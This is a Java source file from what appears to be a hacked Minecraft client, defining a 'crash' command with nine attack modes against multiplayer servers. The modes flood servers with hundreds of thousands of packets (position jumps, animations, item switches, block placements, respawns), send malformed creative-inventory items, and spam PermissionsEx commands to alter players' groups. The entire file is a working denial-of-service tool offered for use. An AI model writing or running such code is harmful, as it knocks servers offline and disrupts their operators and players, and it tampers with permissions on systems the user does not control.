package me.nuf.glade.command.impl.server;

import me.nuf.api.stopwatch.Stopwatch;
import me.nuf.glade.command.Argument;
import me.nuf.glade.command.Command;
import net.minecraft.init.Blocks;
import net.minecraft.init.Items;
import net.minecraft.item.Item;
import net.minecraft.item.ItemStack;
import net.minecraft.network.play.client.*;

import java.util.Objects;

/**
 * Created by nuf on 3/23/2016.
 */
public final class Crash extends Command {
    private final Stopwatch stopwatch = new Stopwatch();

    public Crash() {
        super(new String[]{"crash", "c"}, new Argument(String.class, "type|list"));
    }

    @Override
    public String dispatch() {
        switch (getArgument("type|list").getValue()) {
            case "pex":
                String[] abc = {"a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p",
                        "q", "r", "s", "t", "u", "w", "x", "y", "z"};
                for (String initial : abc)
                    if (stopwatch.hasReached(500)) {
                        minecraft.thePlayer.sendChatMessage(String.format("/pex user %s group set Number", initial));
                        stopwatch.reset();
                    }
                break;
            case "vanilla":
                for (int index = 0; index < 999; index++)
                    minecraft.getNetHandler().addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(
                            minecraft.thePlayer.posX + 99999 * index, minecraft.thePlayer.getEntityBoundingBox().minY + 99999 * index,
                            minecraft.thePlayer.posZ + 99999 * index, true));
                break;
            case "suicide":
                for (int index = 0; index < 2500; index++) {
                    minecraft.thePlayer.sendChatMessage("/suicide");
                    minecraft.getNetHandler().addToSendQueue(
                            new C16PacketClientStatus(C16PacketClientStatus.EnumState.PERFORM_RESPAWN));
                }
                break;
            case "itemswitch":
                for (int index = 0; index < 100000; index++) {
                    minecraft.getNetHandler().addToSendQueue(new C09PacketHeldItemChange(2));
                    minecraft.getNetHandler().addToSendQueue(new C03PacketPlayer(true));
                    minecraft.getNetHandler().addToSendQueue(new C09PacketHeldItemChange(2));
                    minecraft.getNetHandler().addToSendQueue(new C03PacketPlayer(true));
                }
                break;
            case "boxer":
                for (int index = 0; index < 1000000; index++)
                    minecraft.getNetHandler().addToSendQueue(new C0APacketAnimation());
                break;
            case "map":
                for (int index = 0; index < 100000; index++) {
                    minecraft.getNetHandler()
                            .addToSendQueue(new C10PacketCreativeInventoryAction(36, new ItemStack(Items.map)));
                    minecraft.getNetHandler().addToSendQueue(new C08PacketPlayerBlockPlacement(new ItemStack(Items.beef)));
                }
                break;
            case "build":
                for (int index = 0; index < 10000; index++)
                    minecraft.getNetHandler()
                            .addToSendQueue(new C08PacketPlayerBlockPlacement(new ItemStack(Items.apple)));
                break;
            case "creative":
                ItemStack plant = new ItemStack(Blocks.double_plant);
                plant.stackSize = 64;
                plant.setItemDamage(69);
                for (int index = 0; index < 9; index++) {
                    ItemStack is = minecraft.thePlayer.inventory.getStackInSlot(index);
                    if ((Objects.nonNull(is)) && (Item.getIdFromItem(is.getItem()) == 175)
                            && (is.getItemDamage() == 1337)) {
                        if (is.stackSize == 64)
                            continue;
                        minecraft.thePlayer.sendQueue.addToSendQueue(new C10PacketCreativeInventoryAction(
                                minecraft.thePlayer.inventory.currentItem + 36, plant));
                        minecraft.thePlayer.inventory.setInventorySlotContents(minecraft.thePlayer.inventory.currentItem, plant);
                    }
                }
                if (Objects.isNull(minecraft.thePlayer.getHeldItem())) {
                    minecraft.thePlayer.sendQueue.addToSendQueue(
                            new C10PacketCreativeInventoryAction(minecraft.thePlayer.inventory.currentItem + 36, plant));
                    minecraft.thePlayer.inventory.setInventorySlotContents(minecraft.thePlayer.inventory.currentItem, plant);
                }
                for (int index = 0; index < 9; index++)
                    if ((Objects.isNull(minecraft.thePlayer.inventory.getStackInSlot(index)))
                            || (Item.getIdFromItem(minecraft.thePlayer.inventory.getStackInSlot(index).getItem()) == 0))
                        minecraft.thePlayer.sendQueue.addToSendQueue(new C10PacketCreativeInventoryAction(index + 36, plant));
                minecraft.thePlayer.sendQueue.addToSendQueue(
                        new C10PacketCreativeInventoryAction(minecraft.thePlayer.inventory.currentItem + 36, plant));
                break;
            case "hop":
                for (int index = 0; index < 1000; index++) {
                    minecraft.getNetHandler().addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(minecraft.thePlayer.posX,
                            minecraft.thePlayer.posY + 0.1D, minecraft.thePlayer.posZ, true));
                    minecraft.getNetHandler().addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(minecraft.thePlayer.posX,
                            minecraft.thePlayer.posY, minecraft.thePlayer.posZ, true));
                }
                break;
            case "list":
                return "Crashes (9): pex, vanilla, suicide, itemswitch, boxer, map, build, creative, hop";
        }
        return "Attempting to crash...";
    }
}
